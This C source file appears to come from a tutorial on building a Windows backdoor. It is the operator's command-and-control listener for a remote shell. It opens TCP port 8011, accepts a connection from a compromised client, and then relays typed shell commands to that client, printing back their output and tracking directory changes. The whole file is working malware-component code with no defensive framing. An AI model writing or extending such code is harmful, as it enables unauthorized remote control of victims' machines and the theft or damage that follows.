//
// Created by beyon on 4/28/2023.
//

//https://youtu.be/2-xNui9H-Ro?t=4221

//POINTERS VIDEO
//https://www.youtube.com/watch?v=2ybLD6_2gKM

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <windows.h>
#include <winsock2.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <ws2tcpip.h>

#define MSG_WAITALL 0x8 /* do not complete until packet is completely filled */
#define bzero(p, size) (void) memset((p), 0, (size));

char cwd[512];

int main()
{
    unsigned int sock, clientSocket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in serverAddr, clientAddr;
    int i = 0;
    int optval = 1;
    int connected = 0;
    char tempdir[512];
    socklen_t clientLength;

    WSADATA wsaData;
    if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);

    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0){
        printf("error setting tcp socket options!\n");
        printf("Error: %d", WSAGetLastError());
        return 1;
    }
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.S_un.S_addr = INADDR_ANY; // use default
    serverAddr.sin_port = htons(8011);

    if(bind(sock, (struct sockaddr*) &serverAddr, sizeof(serverAddr)) != 0){
        printf("bind failed, error code: %d", WSAGetLastError());
        return 1;
    }
    if(listen(sock, 5) != 0){
        printf("listen failed, error code: %d", WSAGetLastError());
        return 1;
    }
    clientLength = sizeof(clientAddr);
    puts("Awating connection...");
    clientSocket = accept(sock, (struct sockaddr*) &clientAddr, &clientLength);
    printf("Established connection with client %s.\n", inet_ntoa(clientAddr.sin_addr));
    recv(clientSocket, cwd, sizeof(cwd), 0);

    while(1)
    {
        jump:
        bzero(&buffer, sizeof(buffer));
        bzero(&response, sizeof(response));
        printf("%s> ", cwd);
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "\n");
        if(send(clientSocket, buffer, sizeof(buffer), 0)==-1){
            printf("Connection failed\n");
            break;
        }
//        printf("buffer: %s\n", buffer);
        if(strncmp("q", buffer, 1) == 0){
            closesocket(sock);
            WSACleanup();
            break;
        } else if(strncmp("cd ", buffer, 3) == 0){
                recv(clientSocket, cwd, sizeof(cwd), 0);
        } else {
            recv(clientSocket, response, sizeof(response), MSG_WAITALL);
            printf("%s", response);
        }
    }
}